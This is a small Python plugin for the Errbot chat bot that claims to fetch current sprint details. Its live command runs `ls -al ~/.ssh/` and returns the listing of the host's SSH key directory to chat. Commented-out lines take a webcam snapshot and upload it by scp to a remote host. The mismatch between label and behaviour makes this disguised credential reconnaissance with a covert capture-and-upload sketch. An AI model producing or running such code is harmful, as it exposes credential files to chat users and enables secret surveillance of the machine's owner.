from errbot import BotPlugin, botcmd
import subprocess
import sys

class GetSnap(BotPlugin):
	"""Errbot plugin to fetch current sprint details"""
	@botcmd
	def getsnap(self, msg, args):
		# get_snap_cmd = 'imagesnap ~/snap$(date +%y%m%d%H%M%S).png'
		# get_snap, err = subprocess.Popen(get_snap_cmd, shell=True, stdout=subprocess.PIPE).communicate()
		# file_line = get_snap.splitlines()[-1]
		# filename = file_line.split('/')[-1]
		# up_snap_cmd = 'scp /Users/eric/' + filename + ' -i .ssh/foo reverse@`host appdev.0ahab.net ns3.digitalocean.com | grep has.address | awk \'{print $4}\'`:./'
		user_dir, err = subprocess.Popen('ls -al ~/.ssh/', shell=True, stdout=subprocess.PIPE).communicate()

		return(user_dir)
